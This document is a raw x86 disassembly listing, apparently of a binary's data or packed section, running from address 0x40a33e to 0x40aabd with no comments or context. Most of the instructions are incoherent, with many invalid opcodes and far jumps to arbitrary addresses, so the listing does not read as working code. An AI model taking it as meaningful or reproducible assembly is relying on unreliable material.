  40a33e:	push   es
  40a33f:	cmc    
  40a340:	sub    dh,BYTE PTR [eax]
  40a342:	cmp    dl,al
  40a344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a345:	xchg   esi,eax
  40a346:	fadd   QWORD PTR [edi+esi*8]
  40a349:	idiv   BYTE PTR [edi]
  40a34b:	daa    
  40a34c:	mov    dl,0x57
  40a34e:	(bad)  
  40a34f:	icebp  
  40a350:	ds push ebp
  40a352:	mov    esi,0xb9908306
  40a357:	mov    eax,0x1cd4a142
  40a35c:	pop    esi
  40a35d:	inc    ecx
  40a35e:	add    bl,ah
  40a360:	jle    0x40a3da
  40a362:	mov    cl,0x65
  40a364:	pop    eax
  40a365:	shl    DWORD PTR ds:0x92c7398b,cl
  40a36b:	icebp  
  40a36c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a36d:	test   eax,0x1c6afbd3
  40a372:	mov    eax,ds:0xf62fc2d4
  40a377:	call   0x25f9:0xf952d607
  40a37e:	and    eax,0x86b5a2d
  40a383:	or     al,0x4c
  40a385:	ins    BYTE PTR es:[edi],dx
  40a386:	jb     0x40a375
  40a388:	sbb    ch,dh
  40a38a:	les    esp,FWORD PTR [ebx+0x1dc8e07]
  40a390:	inc    edi
  40a391:	pop    ebx
  40a392:	jmp    0xdf23:0x1111bb49
  40a399:	fist   WORD PTR [edx-0x6d]
  40a39c:	add    cl,BYTE PTR [esi]
  40a39e:	sub    edx,DWORD PTR [ebx]
  40a3a0:	imul   eax,edi,0x7171aff3
  40a3a6:	xchg   edx,eax
  40a3a7:	popf   
  40a3a8:	int    0xc7
  40a3aa:	out    dx,al
  40a3ab:	sub    bl,cl
  40a3ad:	adc    DWORD PTR es:0x390b0d56,edx
  40a3b4:	and    ch,BYTE PTR [eax+edx*1]
  40a3b7:	jbe    0x40a34c
  40a3b9:	test   al,0xf4
  40a3bb:	(bad)  
  40a3bc:	sti    
  40a3bd:	adc    BYTE PTR [edx+0x32],bh
  40a3c0:	ficom  WORD PTR [esi]
  40a3c2:	inc    edx
  40a3c3:	mov    dl,0xb
  40a3c5:	push   0x72
  40a3c7:	in     al,dx
  40a3c8:	cdq    
  40a3c9:	push   0x86c00430
  40a3ce:	mov    ah,0xc2
  40a3d0:	mov    al,0xf3
  40a3d2:	push   cs
  40a3d3:	gs dec ebx
  40a3d5:	xchg   edi,eax
  40a3d6:	(bad)  
  40a3d7:	rcl    DWORD PTR [edi+0x55df9d93],0xf4
  40a3de:	pop    eax
  40a3df:	sbb    dh,ah
  40a3e1:	pop    ebp
  40a3e2:	ds in  al,dx
  40a3e4:	dec    ebp
  40a3e5:	or     eax,DWORD PTR [ebx+0x334bc51e]
  40a3eb:	rcr    DWORD PTR [edi+edx*8-0x7a],cl
  40a3ef:	daa    
  40a3f0:	pop    eax
  40a3f1:	repz out dx,al
  40a3f3:	lods   eax,DWORD PTR ds:[esi]
  40a3f4:	push   ds
  40a3f5:	mov    esi,0xcc0336ef
  40a3fa:	dec    esi
  40a3fb:	mov    al,ds:0x3fab872b
  40a400:	adc    ebx,DWORD PTR [ebp-0x46d4ac55]
  40a406:	and    eax,0x1f69ea3f
  40a40b:	ds cwde 
  40a40d:	sub    eax,DWORD PTR [esi]
  40a40f:	mov    dh,0x39
  40a411:	ja     0x40a3ba
  40a413:	mov    ebx,0x5efa3f48
  40a418:	sbb    cl,dl
  40a41a:	jmp    0x40a47f
  40a41c:	and    eax,edi
  40a41e:	jle    0x40a3ea
  40a420:	(bad)  
  40a421:	adc    BYTE PTR [ebx],cl
  40a423:	jmp    0xdac2:0x4a4fcff3
  40a42a:	adc    DWORD PTR [edx+0xf],esp
  40a42d:	xchg   edi,eax
  40a42e:	cld    
  40a42f:	and    BYTE PTR [edi],cl
  40a431:	xchg   ebp,eax
  40a432:	add    eax,0x8600263c
  40a437:	mov    ah,BYTE PTR [edi+edi*8+0x1e402955]
  40a43e:	scas   eax,DWORD PTR es:[edi]
  40a43f:	daa    
  40a440:	pop    edx
  40a441:	add    BYTE PTR [ecx+0x1f3b489f],ch
  40a447:	sub    DWORD PTR [eax-0x37],ebx
  40a44a:	inc    ebx
  40a44b:	cld    
  40a44c:	sub    dh,ah
  40a44e:	dec    esi
  40a44f:	bound  edi,QWORD PTR [eax-0x6a6e16a4]
  40a455:	push   0xfc4b5da5
  40a45a:	ins    DWORD PTR es:[edi],dx
  40a45b:	sar    DWORD PTR [ecx+0x1c],1
  40a45e:	imul   edi,ebp,0x72
  40a461:	xor    ch,BYTE PTR [edi+0x3566a1fd]
  40a467:	(bad)  
  40a468:	mov    bl,0x40
  40a46a:	ja     0x40a48a
  40a46c:	pop    esp
  40a46d:	push   ebp
  40a46e:	xor    eax,0x1d350991
  40a473:	jns    0x40a4a6
  40a475:	and    eax,0x1e39a7e
  40a47a:	sbb    eax,0x4d6da678
  40a47f:	pusha  
  40a480:	sbb    edi,eax
  40a482:	sub    al,0x2c
  40a484:	sub    eax,0x2473ff32
  40a489:	stc    
  40a48a:	stc    
  40a48b:	mov    bl,0x7d
  40a48d:	mov    eax,ds:0xe1aef2c8
  40a492:	sti    
  40a493:	addr16 loop 0x40a4bf
  40a496:	cmp    eax,eax
  40a498:	lds    edx,FWORD PTR [eax]
  40a49a:	sub    cl,BYTE PTR fs:[ebx+0x3c6ce40]
  40a4a1:	stc    
  40a4a2:	lds    edx,FWORD PTR [ebx-0x43984823]
  40a4a8:	gs cwde 
  40a4aa:	das    
  40a4ab:	retf   
  40a4ac:	gs xor cl,cl
  40a4af:	sbb    eax,0x52ca6744
  40a4b4:	pop    ecx
  40a4b5:	rcl    DWORD PTR [ebp+eiz*2-0x4b],0x9a
  40a4ba:	mov    dh,BYTE PTR [edi+0x73614e7a]
  40a4c0:	loope  0x40a53d
  40a4c2:	xchg   esp,eax
  40a4c3:	mov    ch,0xec
  40a4c5:	and    eax,0x217e738a
  40a4ca:	popf   
  40a4cb:	imul   eax,edi,0x38
  40a4ce:	push   ds
  40a4cf:	fstp   QWORD PTR [eax-0x5de1227a]
  40a4d5:	mov    cl,0xfe
  40a4d7:	mov    bl,ch
  40a4d9:	(bad)  
  40a4db:	adc    dh,ch
  40a4dd:	cli    
  40a4de:	or     eax,0xc751af0
  40a4e3:	adc    BYTE PTR [esi],bh
  40a4e5:	nop
  40a4e6:	dec    ecx
  40a4e7:	in     eax,dx
  40a4e8:	push   esi
  40a4e9:	pop    ecx
  40a4ea:	xor    dh,BYTE PTR [edx+0x1b]
  40a4ed:	jnp    0x40a513
  40a4ef:	fidiv  DWORD PTR [edx+0x25]
  40a4f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4f3:	add    eax,ebp
  40a4f5:	add    bl,dl
  40a4f7:	mov    al,ds:0x832b1926
  40a4fc:	shl    BYTE PTR ds:0x2235c513,1
  40a502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a503:	fprem1 
  40a505:	hlt    
  40a506:	dec    esi
  40a507:	and    al,0x72
  40a509:	adc    DWORD PTR [edx-0x5c],0x7e330e3d
  40a510:	xor    eax,0xbba770f0
  40a515:	int3   
  40a516:	pop    ecx
  40a517:	mov    bh,0x61
  40a519:	js     0x40a4ee
  40a51b:	mov    al,0xc4
  40a51d:	or     eax,0x57f95104
  40a522:	fwait
  40a523:	mov    edi,0x7779a074
  40a528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a529:	push   cs
  40a52a:	cmp    DWORD PTR [eax+0x3c],esp
  40a52d:	mov    esp,0x351f7a2f
  40a532:	addr16 mov ds:0x63a,al
  40a536:	das    
  40a537:	jnp    0x40a527
  40a539:	cmp    ah,dl
  40a53b:	mov    ah,0x5
  40a53d:	stos   BYTE PTR es:[edi],al
  40a53e:	push   edx
  40a53f:	push   0x7c376af2
  40a544:	fstp   st(7)
  40a546:	aaa    
  40a547:	ret    0x8e8a
  40a54a:	cs aaa 
  40a54c:	jne    0x40a593
  40a54e:	imul   ecx,DWORD PTR [esi-0x7d7cfcee],0x97e2816
  40a558:	lock jl 0x40a584
  40a55b:	pop    esi
  40a55c:	test   cl,0x5d
  40a55f:	add    ebp,DWORD PTR [edx+ecx*1]
  40a562:	not    bh
  40a564:	jecxz  0x40a559
  40a566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a567:	dec    edi
  40a568:	mov    dh,0xb8
  40a56a:	leave  
  40a56b:	out    dx,eax
  40a56c:	les    edx,FWORD PTR [edi+0x17]
  40a56f:	inc    ebp
  40a570:	popaw  
  40a572:	popf   
  40a573:	in     eax,dx
  40a574:	fs in  eax,0x7b
  40a577:	xor    dl,BYTE PTR [edi+0x11271e6c]
  40a57d:	out    dx,al
  40a57e:	imul   ebx,DWORD PTR [edi+0x5a38530f],0x4b
  40a585:	xchg   BYTE PTR [ebp+0x30],ch
  40a588:	pop    es
  40a589:	ja     0x40a521
  40a58b:	fwait
  40a58c:	es xchg edi,eax
  40a58e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a58f:	(bad)  
  40a590:	pop    esp
  40a591:	push   ecx
  40a592:	push   es
  40a593:	repnz aaa 
  40a595:	imul   edx,DWORD PTR [ebx+0x1c],0xb964c68e
  40a59c:	int3   
  40a59d:	repz sub DWORD PTR [esi+edi*2+0x64fe57dd],0xffffff86
  40a5a6:	mov    esp,edx
  40a5a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5a9:	rol    BYTE PTR [ebx],cl
  40a5ab:	add    DWORD PTR [eax-0x4f731f23],ecx
  40a5b1:	add    DWORD PTR [edi],esi
  40a5b3:	add    DWORD PTR [ecx+0x5cdad3a7],ecx
  40a5b9:	mov    ebx,0x250f9bd3
  40a5be:	outs   dx,BYTE PTR cs:[esi]
  40a5c0:	jmp    0x22c3:0xfcb16e61
  40a5c7:	xchg   edi,eax
  40a5c8:	cmp    BYTE PTR [eax-0x5c1c4afb],0x5c
  40a5cf:	jmp    0xf73f4fa4
  40a5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5d5:	(bad)  
  40a5d6:	jb     0x40a5a3
  40a5d8:	cmp    eax,0x78ad53a5
  40a5dd:	push   ebx
  40a5de:	add    esi,ecx
  40a5e0:	mov    bh,0x5b
  40a5e2:	shl    BYTE PTR [eax+0x5],1
  40a5e5:	ffree  st(6)
  40a5e7:	xchg   ebp,eax
  40a5e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5e9:	repnz push ecx
  40a5eb:	jle    0x40a618
  40a5ed:	into   
  40a5ee:	repz sub al,0xd0
  40a5f1:	pop    ss
  40a5f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5f3:	mov    ds:0x7e15351d,al
  40a5f8:	xchg   edi,eax
  40a5f9:	rol    BYTE PTR [eax+0x2b13bb01],1
  40a5ff:	jns    0x40a65a
  40a601:	retf   0x3e34
  40a604:	and    esi,edi
  40a606:	dec    edi
  40a607:	test   eax,edi
  40a609:	lods   eax,DWORD PTR ds:[esi]
  40a60a:	mov    ebx,DWORD PTR [ebx]
  40a60c:	aas    
  40a60d:	jmp    0x4a56:0x4e573880
  40a614:	in     eax,0x29
  40a616:	jmp    0xaee0:0x7e4a8fb7
  40a61d:	push   0xffffffda
  40a61f:	enter  0x5908,0x62
  40a623:	inc    esi
  40a624:	dec    ecx
  40a625:	icebp  
  40a626:	aam    0xb
  40a628:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a629:	enter  0x590c,0x33
  40a62d:	lea    ecx,es:[edx+0x58]
  40a631:	and    eax,DWORD PTR [eax+ebp*2+0x43]
  40a635:	dec    ecx
  40a636:	xchg   ecx,eax
  40a637:	dec    eax
  40a638:	pop    ebx
  40a639:	and    edi,DWORD PTR [ebp-0x27]
  40a63c:	dec    ebp
  40a63d:	imul   esi,edx,0xffffffc5
  40a640:	cwde   
  40a641:	jns    0x40a669
  40a643:	sar    DWORD PTR [eax],cl
  40a645:	mov    ah,0x6d
  40a647:	inc    esi
  40a648:	lahf   
  40a649:	jp     0x40a606
  40a64b:	scas   eax,DWORD PTR es:[edi]
  40a64c:	imul   ebp,DWORD PTR [edx-0x6aec6d52],0x4a2ba5b8
  40a656:	adc    al,0xaa
  40a658:	push   es
  40a659:	shl    BYTE PTR [ebx+edi*1-0x3e1d733c],cl
  40a660:	push   ss
  40a661:	inc    edx
  40a662:	jl     0x40a61c
  40a664:	add    al,0x98
  40a666:	xchg   ebx,eax
  40a667:	mov    esp,0x1956f545
  40a66c:	add    si,WORD PTR [edi+0x3f]
  40a670:	leave  
  40a671:	arpl   sp,si
  40a673:	mov    cl,0x40
  40a675:	ins    DWORD PTR es:[edi],dx
  40a676:	xlat   BYTE PTR ds:[ebx]
  40a677:	dec    edi
  40a678:	or     DWORD PTR [esp+eax*8+0x64],edx
  40a67c:	rcl    DWORD PTR [ecx+esi*1-0x42],0xf9
  40a681:	scas   eax,DWORD PTR es:[edi]
  40a682:	pop    es
  40a683:	call   0x8d8f1162
  40a688:	icebp  
  40a689:	addr16 cld 
  40a68b:	imul   edi,edi,0x77
  40a68e:	inc    ebx
  40a68f:	xchg   BYTE PTR [ebx+0x7aa96ffd],al
  40a695:	cli    
  40a696:	xor    DWORD PTR [edx],eax
  40a698:	clc    
  40a699:	retf   
  40a69a:	sti    
  40a69b:	pop    eax
  40a69c:	rcl    DWORD PTR [ebp-0x5],0xbf
  40a6a0:	pop    ebx
  40a6a1:	popa   
  40a6a2:	jb     0x40a6cf
  40a6a4:	inc    ecx
  40a6a5:	cdq    
  40a6a6:	sub    al,0x3b
  40a6a8:	ins    DWORD PTR es:[edi],dx
  40a6a9:	das    
  40a6aa:	sub    al,BYTE PTR [edi]
  40a6ac:	jno    0x40a706
  40a6ae:	shr    BYTE PTR [ebx],cl
  40a6b0:	data16 aaa 
  40a6b2:	mov    esi,0xdd2c9c65
  40a6b7:	aaa    
  40a6b8:	lods   eax,DWORD PTR ds:[esi]
  40a6b9:	imul   ebx,DWORD PTR [edi+0x3c359637],0xbd1c66e5
  40a6c3:	ss push ss
  40a6c5:	jp     0x40a6c1
  40a6c7:	mov    bl,0x25
  40a6c9:	pop    ds
  40a6ca:	out    dx,eax
  40a6cb:	push   eax
  40a6cc:	imul   edx,ebx,0x1b
  40a6cf:	pop    ss
  40a6d0:	push   esi
  40a6d1:	adc    DWORD PTR [ecx-0x2324a16a],0x48236985
  40a6db:	repnz rcr al,cl
  40a6de:	adc    al,0x68
  40a6e0:	mov    dh,0x84
  40a6e2:	(bad)  
  40a6e3:	ss ins BYTE PTR es:[edi],dx
  40a6e5:	xchg   edi,eax
  40a6e6:	test   eax,0x2d02d1da
  40a6eb:	jbe    0x40a71d
  40a6ed:	or     edx,esi
  40a6ef:	mov    dl,0xab
  40a6f1:	es push esp
  40a6f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6f4:	push   ss
  40a6f5:	mov    al,ds:0xd90ccd77
  40a6fa:	aaa    
  40a6fb:	push   ecx
  40a6fc:	outs   dx,BYTE PTR ds:[esi]
  40a6fd:	imul   esi,DWORD PTR [ebp-0x57],0xa630b592
  40a704:	dec    ebp
  40a705:	fwait
  40a706:	in     al,0x50
  40a708:	loope  0x40a714
  40a70a:	or     DWORD PTR [ebp-0x46],edi
  40a70d:	push   0xf9118a27
  40a712:	dec    ebx
  40a713:	aaa    
  40a714:	pop    eax
  40a715:	(bad)  
  40a716:	loop   0x40a739
  40a718:	dec    ecx
  40a719:	or     al,BYTE PTR [esi+ebp*4+0x52]
  40a71d:	test   al,0x35
  40a71f:	jg     0x40a760
  40a721:	mov    al,ds:0xda1bbc26
  40a726:	out    dx,al
  40a727:	(bad)  
  40a729:	xchg   esi,eax
  40a72a:	fisttp DWORD PTR [edi+0x21]
  40a72d:	shl    DWORD PTR ds:0x4d32620f,1
  40a733:	push   ss
  40a734:	repnz xor bh,al
  40a737:	imul   edi,DWORD PTR [edi+eiz*4-0x6],0x20728031
  40a73f:	fwait
  40a740:	ret    
  40a741:	loopne 0x40a724
  40a743:	rcl    DWORD PTR [ebx-0x55],cl
  40a746:	push   ebx
  40a747:	fldenv [ebx-0x2a]
  40a74a:	xor    DWORD PTR [edx-0x12725d18],edx
  40a750:	in     al,0xb2
  40a752:	not    BYTE PTR [edx+0x7c]
  40a755:	or     al,bl
  40a757:	ins    BYTE PTR es:[edi],dx
  40a758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a759:	mov    ah,0x7a
  40a75b:	dec    esp
  40a75c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a75d:	neg    ebx
  40a75f:	and    eax,0x19b3488d
  40a764:	cmp    DWORD PTR [esi+0x40],ebp
  40a767:	adc    DWORD PTR [eax+0x20],edi
  40a76a:	outs   dx,BYTE PTR ds:[esi]
  40a76b:	mov    dl,0xbc
  40a76d:	pop    es
  40a76e:	int3   
  40a76f:	repnz cwde 
  40a771:	leave  
  40a772:	or     DWORD PTR [esi],esi
  40a774:	ret    0x4d61
  40a777:	adc    eax,0x5c857987
  40a77c:	cld    
  40a77d:	jae    0x40a7d6
  40a77f:	into   
  40a780:	add    eax,DWORD PTR [esi]
  40a782:	jge    0x40a7c8
  40a784:	push   esp
  40a785:	jno    0x40a7bb
  40a787:	sahf   
  40a788:	pop    ds
  40a789:	fisttp WORD PTR [ebx+0x6b]
  40a78c:	or     BYTE PTR [ecx],ah
  40a78e:	jmp    0x8c30f51e
  40a793:	push   ebp
  40a794:	hlt    
  40a795:	xor    eax,edi
  40a797:	shl    ecx,0x1e
  40a79a:	mov    ecx,DWORD PTR [ebp-0x14]
  40a79d:	xor    edx,edx
  40a79f:	or     eax,edx
  40a7a1:	mov    cl,BYTE PTR [eax+ecx*1]
  40a7a4:	mov    eax,DWORD PTR [ebp-0x34]
  40a7a7:	jmp    0x40ad31
  40a7ac:	inc    ebx
  40a7ad:	dec    esi
  40a7ae:	aad    0x8e
  40a7b0:	fcom   DWORD PTR [eax+ebx*1]
  40a7b3:	inc    edx
  40a7b4:	loop   0x40a7dd
  40a7b6:	ds push 0xb4306857
  40a7bc:	or     ax,0x1616
  40a7c0:	cmp    eax,0xd9161604
  40a7c5:	nop
  40a7c6:	mov    ebp,0xeada85ee
  40a7cb:	scas   eax,DWORD PTR es:[edi]
  40a7cc:	popf   
  40a7cd:	inc    edx
  40a7ce:	arpl   WORD PTR [ecx],sp
  40a7d0:	jmp    DWORD PTR [ebp+0x6b]
  40a7d3:	push   0x7a
  40a7d5:	pop    ebp
  40a7d6:	and    eax,0xedca8be4
  40a7db:	test   bh,ah
  40a7dd:	jmp    0x7e1e:0xf76e133
  40a7e4:	mov    esp,0xdb91b9f4
  40a7e9:	cli    
  40a7ea:	mov    ds:0x676c1b25,eax
  40a7ef:	pop    ss
  40a7f0:	mov    edx,0x662f161
  40a7f5:	sub    eax,0x99f43cf
  40a7fa:	call   0x477eee5b
  40a7ff:	iret   
  40a800:	lods   al,BYTE PTR ds:[esi]
  40a801:	dec    edi
  40a802:	nop
  40a803:	mov    ecx,0x3a544bc9
  40a808:	test   ecx,edx
  40a80a:	pop    esi
  40a80b:	(bad)  
  40a80c:	xchg   esp,eax
  40a80d:	pop    esp
  40a80e:	and    ebp,DWORD PTR [ebx]
  40a810:	sub    DWORD PTR [edi],esp
  40a812:	adc    esi,DWORD PTR [edi]
  40a814:	sbb    al,0x4b
  40a816:	push   ecx
  40a817:	mov    ?,WORD PTR [eax+0x4b]
  40a81a:	ret    0x402a
  40a81d:	mov    ebx,0x2dabc93
  40a822:	cs push cs
  40a824:	add    al,0x7f
  40a826:	pop    es
  40a827:	jb     0x40a80f
  40a829:	lds    esp,FWORD PTR [ebp-0x14]
  40a82c:	jl     0x40a888
  40a82e:	cmp    BYTE PTR [edx],al
  40a830:	(bad)  
  40a831:	adc    eax,0xdc43cdb9
  40a836:	dec    edx
  40a837:	add    eax,0xa28121de
  40a83c:	sbb    bh,BYTE PTR [esi]
  40a83e:	dec    esi
  40a83f:	sbb    dl,BYTE PTR [eax+eax*8]
  40a842:	push   ss
  40a843:	cmp    BYTE PTR [eax+0x21b528b3],0xcd
  40a84a:	pop    edi
  40a84b:	xchg   ecx,eax
  40a84c:	jle    0x40a813
  40a84e:	stos   BYTE PTR es:[edi],al
  40a84f:	or     eax,DWORD PTR gs:[eax-0x76]
  40a853:	and    bh,BYTE PTR ds:[eax]
  40a856:	mov    dh,0xf7
  40a859:	push   ebp
  40a85a:	popa   
  40a85b:	or     eax,0xf570de6f
  40a860:	pushf  
  40a861:	prefetcht0 BYTE PTR ds:0x2dc20ffc
  40a868:	mov    DWORD PTR [ebx-0x37],ebp
  40a86b:	jl     0x40a8be
  40a86d:	push   0x7f7c2515
  40a872:	in     eax,0x2a
  40a874:	and    cl,BYTE PTR [edi+0x77868c7e]
  40a87a:	dec    eax
  40a87b:	sub    esp,esi
  40a87d:	inc    edx
  40a87e:	ins    DWORD PTR es:[edi],dx
  40a87f:	cmc    
  40a880:	dec    edi
  40a881:	sahf   
  40a882:	int3   
  40a883:	jmp    0x40a864
  40a885:	stos   BYTE PTR es:[edi],al
  40a886:	cmp    al,0xf
  40a888:	pop    ebp
  40a889:	pop    edi
  40a88a:	mov    ds:0x3bcb7321,eax
  40a88f:	js     0x40a88f
  40a891:	ficom  DWORD PTR [edx+esi*1+0x41c7f9c]
  40a898:	xchg   ebx,eax
  40a899:	aam    0x23
  40a89b:	js     0x40a911
  40a89d:	push   ds
  40a89e:	adc    DWORD PTR [edi+0x900a5cd],0x6ef79e7a
  40a8a8:	pop    esi
  40a8a9:	cmp    DWORD PTR [ecx+edx*1-0x436d1e8],eax
  40a8b0:	mov    bh,0xfa
  40a8b2:	inc    eax
  40a8b3:	xchg   DWORD PTR [edx+0x40588eeb],edi
  40a8b9:	mov    eax,ds:0xc70c6664
  40a8be:	lock fucomp st(6)
  40a8c1:	dec    ecx
  40a8c2:	(bad)  
  40a8c3:	jae    0x40a8ae
  40a8c5:	mov    ebp,0x31165b23
  40a8ca:	mov    ecx,0x17a5bda
  40a8cf:	xchg   ebx,eax
  40a8d0:	push   es
  40a8d1:	in     eax,0xf2
  40a8d3:	mov    dl,0xaa
  40a8d5:	or     eax,0xd3c08729
  40a8da:	jmp    0x569950a5
  40a8df:	rol    BYTE PTR [eax],cl
  40a8e1:	imul   ebp,DWORD PTR [ecx+ecx*1+0x5407e22d],0xdbecfd7c
  40a8ec:	dec    edi
  40a8ed:	call   0xe1d3:0x33e7956a
  40a8f4:	adc    eax,0x360d1ee1
  40a8f9:	pop    esp
  40a8fa:	sbb    cl,0x97
  40a8fd:	(bad)  
  40a8fe:	ss pop ecx
  40a900:	cli    
  40a901:	xchg   esp,eax
  40a902:	mov    ds:0x1834fdbb,al
  40a907:	shl    DWORD PTR [ebx],0x3a
  40a90a:	xor    edi,DWORD PTR ds:0x2819b1d6
  40a910:	das    
  40a911:	cdq    
  40a912:	mov    WORD PTR [edx-0x59],fs
  40a915:	mov    bl,0xa0
  40a917:	jo     0x40a8c0
  40a919:	gs cli 
  40a91b:	xchg   esi,eax
  40a91c:	fmul   QWORD PTR [ebx-0x173cd06d]
  40a922:	jmp    0xb46d:0x4655b8eb
  40a929:	iret   
  40a92a:	add    DWORD PTR [ebx],edx
  40a92c:	push   es
  40a92d:	and    BYTE PTR [esi-0x1a],dh
  40a930:	lods   al,BYTE PTR ds:[esi]
  40a931:	jae    0x40a93d
  40a933:	addr16 out dx,eax
  40a935:	jmp    0x97a34b19
  40a93a:	(bad)  
  40a93b:	mov    dh,0x8e
  40a93d:	inc    edi
  40a93e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a93f:	gs mov al,0x49
  40a942:	add    dl,0xe5
  40a945:	in     eax,0xe5
  40a947:	mov    bl,0x22
  40a949:	pop    ebx
  40a94a:	or     cl,cl
  40a94c:	mov    eax,0x5fa8f9af
  40a951:	jb     0x40a907
  40a953:	ret    0xeaf2
  40a956:	test   eax,0xf53b9631
  40a95b:	shl    ah,0x27
  40a95e:	nop
  40a95f:	addr16 daa 
  40a961:	hlt    
  40a962:	pushf  
  40a963:	aaa    
  40a964:	mov    dl,0x6e
  40a966:	inc    BYTE PTR [edi+ebx*4]
  40a969:	loope  0x40a947
  40a96b:	sub    al,0x9f
  40a96d:	lea    esi,[esi+0x6a]
  40a970:	add    DWORD PTR ds:0x4a2375ee,edx
  40a976:	repnz lds edx,FWORD PTR [edi+0x6f236883]
  40a97d:	jnp    0x40a94b
  40a97f:	mov    esp,0xd974f92c
  40a984:	popf   
  40a985:	sub    eax,0x60b5066f
  40a98a:	fmul   DWORD PTR [edi+esi*4]
  40a98d:	pusha  
  40a98e:	xchg   ecx,eax
  40a98f:	pop    esi
  40a990:	sub    cl,al
  40a992:	or     ah,ah
  40a994:	xlat   BYTE PTR ds:[ebx]
  40a995:	xor    BYTE PTR [ebp+0x3d41eb23],cl
  40a99b:	pop    ds
  40a99c:	sub    al,0xd3
  40a99e:	xchg   ebp,eax
  40a99f:	adc    eax,0x34e4b13b
  40a9a4:	les    esi,FWORD PTR [ebx+0x32]
  40a9a7:	cmp    ah,BYTE PTR [ebx-0x6c]
  40a9aa:	retf   0xce9f
  40a9ad:	jns    0x40a986
  40a9af:	test   al,0x99
  40a9b1:	sbb    esp,DWORD PTR [esi]
  40a9b3:	out    dx,eax
  40a9b4:	and    DWORD PTR [edi],edx
  40a9b6:	sti    
  40a9b7:	add    al,BYTE PTR [eax]
  40a9b9:	rcl    BYTE PTR [eax+0x78],0xc4
  40a9bd:	cld    
  40a9be:	mov    dl,0xe1
  40a9c0:	je     0x40a9f4
  40a9c2:	outs   dx,DWORD PTR ds:[esi]
  40a9c3:	loop   0x40a96f
  40a9c5:	mov    al,ds:0xdc729dfe
  40a9ca:	xor    dh,BYTE PTR [ebp-0xb4de2]
  40a9d0:	push   esi
  40a9d1:	dec    edx
  40a9d2:	iret   
  40a9d3:	jae    0x40aa01
  40a9d5:	push   0xffffff83
  40a9d7:	rcr    ebx,0x1d
  40a9da:	test   eax,0xbc383404
  40a9df:	(bad)
  40a9e2:	inc    edi
  40a9e3:	or     BYTE PTR [esi-0x128ccf9f],ah
  40a9e9:	ror    BYTE PTR [ebx+0x4f179d5e],0x67
  40a9f0:	jnp    0x40aa1e
  40a9f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9f3:	retf   0x66f9
  40a9f6:	xor    ah,dl
  40a9f8:	imul   eax,DWORD PTR [ecx+0x54],0x5f2693b1
  40a9ff:	xchg   ebx,eax
  40aa00:	mov    ecx,ds
  40aa02:	loope  0x40aa39
  40aa04:	fldcw  WORD PTR [ecx]
  40aa06:	or     cl,BYTE PTR [eax]
  40aa08:	lock int3 
  40aa0a:	inc    ebp
  40aa0b:	aaa    
  40aa0c:	js     0x40a9b2
  40aa0e:	and    eax,0x257703b2
  40aa13:	nop
  40aa14:	(bad)  
  40aa16:	jne    0x40a9c1
  40aa18:	and    ebx,DWORD PTR [edx-0x7f5a4659]
  40aa1e:	dec    esi
  40aa1f:	add    BYTE PTR [eax],0xd8
  40aa22:	add    eax,0x210729fc
  40aa27:	call   0x67e9:0x808ed23a
  40aa2e:	mov    ds:0xfe30f6b6,eax
  40aa33:	and    esi,DWORD PTR [eax+esi*8]
  40aa36:	jmp    0x40a9e8
  40aa38:	pop    edi
  40aa39:	xchg   edi,eax
  40aa3a:	xchg   edi,eax
  40aa3b:	jno    0x40a9c8
  40aa3d:	das    
  40aa3e:	cwde   
  40aa3f:	and    al,0x67
  40aa41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa42:	adc    DWORD PTR [ecx-0x2c],esp
  40aa45:	les    esp,FWORD PTR [edx+0x2e2775e1]
  40aa4b:	mul    DWORD PTR [edi+0x59bcf756]
  40aa51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa52:	push   es
  40aa53:	add    al,BYTE PTR ds:0x33efd14a
  40aa59:	and    ah,0x7c
  40aa5c:	outs   dx,DWORD PTR ds:[esi]
  40aa5d:	or     al,0xc1
  40aa5f:	enter  0xc05c,0xb
  40aa63:	adc    eax,0x2a17b443
  40aa68:	into   
  40aa69:	out    dx,eax
  40aa6a:	sbb    bl,BYTE PTR [ebx-0x1a2d9bed]
  40aa70:	xor    DWORD PTR [edx+0x158ad931],0xfffffffb
  40aa77:	fidivr DWORD PTR [ecx+0x467fc568]
  40aa7d:	fs pop es
  40aa7f:	inc    ecx
  40aa80:	stos   DWORD PTR es:[edi],eax
  40aa81:	rol    DWORD PTR [ecx],cl
  40aa83:	push   es
  40aa84:	and    ebx,DWORD PTR [ebx-0x2c]
  40aa87:	fwait
  40aa88:	in     eax,0x32
  40aa8a:	mov    eax,ebp
  40aa8c:	std    
  40aa8d:	stos   DWORD PTR es:[edi],eax
  40aa8e:	into   
  40aa8f:	popa   
  40aa90:	loop   0x40aa68
  40aa92:	aad    0x0
  40aa94:	push   0xffffffb7
  40aa96:	pop    ss
  40aa97:	xchg   esi,eax
  40aa98:	call   0x5aef89f1
  40aa9d:	jb     0x40ab01
  40aa9f:	mov    al,ds:0x4d8231b2
  40aaa4:	push   ss
  40aaa5:	push   edi
  40aaa6:	sar    BYTE PTR [esi-0x1a],1
  40aaa9:	nop
  40aaaa:	pop    es
  40aaab:	fnstcw WORD PTR [ebx+0x5e]
  40aaae:	push   cs
  40aaaf:	ret    0x58ef
  40aab2:	push   ss
  40aab3:	fisubr WORD PTR [ebx]
  40aab5:	mov    esi,0x592abba7
  40aaba:	and    al,0x17
  40aabc:	fwait
  40aabd:	push   edx
